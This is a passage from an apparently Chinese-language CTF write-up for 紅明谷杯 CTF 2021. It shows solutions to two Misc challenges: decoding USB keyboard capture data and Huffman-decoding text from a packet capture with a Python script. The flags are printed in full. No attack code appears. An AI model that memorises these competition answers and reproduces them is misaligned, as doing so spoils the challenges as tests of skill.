+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000060000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000050000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">00002a0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000230000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000250000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000270000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000210000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000220000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001e0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">00001f0000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000260000000000</span><br><span class="line">0000230000000000</span><br><span class="line">0000200000000000</span><br><span class="line">0000240000000000</span><br><span class="line">0000070000000000</span><br></pre></td></tr></table></figure>
+
+<p>USB Keyboard Data Hacker 跑一下可得如下內容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b3866396564326639333365662&lt;DEL&gt;31346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure>
+
+<p>將資料整理成如下內容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b38663965643266393333656631346138643035323364303334396531323939637d</span><br></pre></td></tr></table></figure>
+
+<p>再 <code>From Hex</code> 即可以得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="歪比歪比"><a href="#歪比歪比" class="headerlink" title="歪比歪比"></a>歪比歪比</h3><p>附件給出的 data 很明顯是流量包，使用 Wireshark 分析，跟蹤 TCP 流。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617516627746.2bb321fbe2bf4f220f0e679d964eee3f8d96eb71.png"></p>
+<p>很容易看出是哈夫曼編碼，網上找一段程式碼解碼。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 統計字元出現頻率，生成對映表</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_frequency</span>(<span class="params">text</span>):</span></span><br><span class="line">    chars = []</span><br><span class="line">    ret = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chars.append(char)</span><br><span class="line">            ret.append((char, text.count(char)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 節點類</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Node</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, frequency</span>):</span></span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line">        self.father = <span class="literal">None</span></span><br><span class="line">        self.frequency = frequency</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_left</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.father.left == self</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立葉子節點</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_nodes</span>(<span class="params">frequency_list</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [Node(frequency) <span class="keyword">for</span> frequency <span class="keyword">in</span> frequency_list]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立Huffman樹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_huffman_tree</span>(<span class="params">nodes</span>):</span></span><br><span class="line">    queue = nodes[:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(queue) &gt; <span class="number">1</span>:</span><br><span class="line">        queue.sort(key=<span class="keyword">lambda</span> item: item.frequency)</span><br><span class="line">        node_left = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_right = queue.pop(<span class="number">0</span>)</span><br><span class="line">        node_father = Node(node_left.frequency + node_right.frequency)</span><br><span class="line">        node_father.left = node_left</span><br><span class="line">        node_father.right = node_right</span><br><span class="line">        node_left.father = node_father</span><br><span class="line">        node_right.father = node_father</span><br><span class="line">        queue.append(node_father)</span><br><span class="line"></span><br><span class="line">    queue[<span class="number">0</span>].father = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> queue[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Huffman編碼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">huffman_encoding</span>(<span class="params">nodes, root</span>):</span></span><br><span class="line">    huffman_code = [<span class="string">&#x27;&#x27;</span>] * <span class="built_in">len</span>(nodes)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nodes)):</span><br><span class="line">        node = nodes[i]</span><br><span class="line">        <span class="keyword">while</span> node != root:</span><br><span class="line">            <span class="keyword">if</span> node.is_left():</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;0&#x27;</span> + huffman_code[i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                huffman_code[i] = <span class="string">&#x27;1&#x27;</span> + huffman_code[i]</span><br><span class="line">            node = node.father</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> huffman_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 編碼整個字串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_str</span>(<span class="params">text, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency:</span><br><span class="line">            <span class="keyword">if</span> char == item[<span class="number">0</span>]:</span><br><span class="line">                ret += codes[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解碼整個字串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_str</span>(<span class="params">huffman_str, char_frequency, codes</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> huffman_str != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> codes:</span><br><span class="line">            <span class="keyword">if</span> item <span class="keyword">in</span> huffman_str <span class="keyword">and</span> huffman_str.index(item) == <span class="number">0</span>:</span><br><span class="line">                ret += char_frequency[i][<span class="number">0</span>]</span><br><span class="line">                huffman_str = huffman_str[<span class="built_in">len</span>(item):]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># text = raw_input(&#x27;The text to encode:&#x27;)</span></span><br><span class="line">    huf_text = <span class="string">&quot;HUFFMAN_ENCODED_TEXT&quot;</span></span><br><span class="line">    char_frequency = [(<span class="string">&#x27;j&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;z&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;7&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;e&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;l&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;6&#x27;</span>, <span class="number">37</span>), (<span class="string">&#x27;4&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;p&#x27;</span>, <span class="number">38</span>), (<span class="string">&#x27;h&#x27;</span>, <span class="number">27</span>),(<span class="string">&#x27;g&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;x&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;i&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;u&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;n&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;8&#x27;</span>, <span class="number">36</span>), (<span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;o&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>),(<span class="string">&#x27;y&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="number">29</span>), (<span class="string">&#x27;b&#x27;</span>, <span class="number">26</span>), (<span class="string">&#x27;m&#x27;</span>, <span class="number">27</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;v&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;d&#x27;</span>, <span class="number">33</span>), (<span class="string">&#x27;f&#x27;</span>, <span class="number">28</span>), (<span class="string">&#x27;9&#x27;</span>, <span class="number">33</span>),(<span class="string">&#x27;t&#x27;</span>, <span class="number">21</span>), (<span class="string">&#x27;w&#x27;</span>, <span class="number">22</span>), (<span class="string">&#x27;a&#x27;</span>, <span class="number">31</span>), (<span class="string">&#x27;r&#x27;</span>, <span class="number">24</span>), (<span class="string">&#x27;s&#x27;</span>, <span class="number">16</span>), (<span class="string">&#x27;k&#x27;</span>, <span class="number">32</span>), (<span class="string">&#x27;5&#x27;</span>, <span class="number">25</span>), (<span class="string">&#x27;q&#x27;</span>, <span class="number">23</span>), (<span class="string">&#x27;3&#x27;</span>, <span class="number">32</span>),(<span class="string">&#x27;&#123;&#x27;</span>, <span class="number">1</span>), (<span class="string">&#x27;-&#x27;</span>, <span class="number">4</span>), (<span class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line">    nodes = create_nodes([item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency])</span><br><span class="line">    root = create_huffman_tree(nodes)</span><br><span class="line">    codes = huffman_encoding(nodes, root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># huffman_str = encode_str(text, char_frequency, codes)</span></span><br><span class="line">    origin_str = decode_str(huf_text, char_frequency, codes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print &#x27;Encode result:&#x27; + huffman_str</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Decode result:&#x27;</span> + origin_str</span><br></pre></td></tr></table></figure>
+
+<p>執行指令碼得到如下結果。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50</span><br></pre></td></tr></table></figure>
+
+<p>此時其中包含有 flag。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是需要注意的是，<code>(&#39;r&#39;, 24),(&#39;0&#39;, 24)</code> 兩個字母的詞頻是一樣的，因此實際上有兩種解法，剩餘的一種如下。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;50d477a2-6036-d0a9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write-shell"><span class="toc-number">1.1.</span> <span class="toc-text">write_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happysql"><span class="toc-number">1.2.</span> <span class="toc-text">happysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eztp"><span class="toc-number">1.3.</span> <span class="toc-text">eztp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InputMonitor"><span class="toc-number">2.2.</span> <span class="toc-text">InputMonitor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E5%BF%83%E6%98%AF%E5%86%B0%E5%86%B0%E7%9A%84"><span class="toc-number">2.3.</span> <span class="toc-text">我的心是冰冰的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%AA%E6%AF%94%E6%AD%AA%E6%AF%94"><span class="toc-number">2.4.</span> <span class="toc-text">歪比歪比</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&text=紅明谷杯 CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&is_video=false&description=紅明谷杯 CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=紅明谷杯 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&name=紅明谷杯 CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&t=紅明谷杯 CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
